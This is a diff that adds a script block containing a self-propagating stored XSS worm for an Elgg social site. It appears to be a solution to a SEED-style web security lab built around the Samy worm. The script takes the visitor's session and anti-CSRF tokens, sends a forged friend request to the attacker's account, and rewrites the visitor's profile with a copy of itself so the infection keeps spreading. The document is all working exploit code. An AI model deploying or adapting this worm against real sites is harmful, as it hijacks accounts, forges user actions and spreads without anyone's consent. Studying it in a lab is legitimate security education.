@@ -1,0 +1,51 @@
+<script type="text/javascript" id="samy">
+  var headerTag = '<script id="samy" type="text/javascript">';
+  var jsCode = document.getElementById("samy").innerHTML;
+  var tailTag = "</" + "script>";
+  var propagatingCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+  window.onload = function() {
+    //JavaScript code to access user name, user guid, Time Stamp elgg_ts and Security Token elgg_token
+
+    //Construct the content of your url.
+
+    var samyGuid = 47; //FILL IN YOUR CODE HERE
+    if (elgg.session.user.guid != samyGuid) {
+      var ajax = new XMLHttpRequest();
+      var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+      var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+      var addFriendUrl =
+        "http://www.xsslabelgg.com/action/friends/add?friend=" + samyGuid;
+      ajax.open("GET", addFriendUrl + ts + token, true);
+      ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+      ajax.setRequestHeader(
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      );
+      ajax.send();
+
+      ajax.onreadystatechange = function() {
+        if (ajax.readyState == 4 || ajax.readyState == 0) {
+          //Create and send Ajax request to modify profile
+          var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+          var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+          var userName = "&name=" + elgg.session.user.name;
+          var guid = "&guid=" + elgg.session.user.guid;
+          var description =
+            "&description=<p>" + "Samy+is+my+hero" + "</" + "p>"; //FILL IN YOUR CODE HERE
+          var content =
+            ts + token + guid + userName + description + propagatingCode;
+          var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
+          Ajax = new XMLHttpRequest();
+          Ajax.open("POST", sendurl, true);
+          Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+          Ajax.setRequestHeader(
+            "Content-Type",
+            "application/x-www-form-urlencoded"
+          );
+          Ajax.send(content);
+        }
+      };
+    }
+  };
+</script>
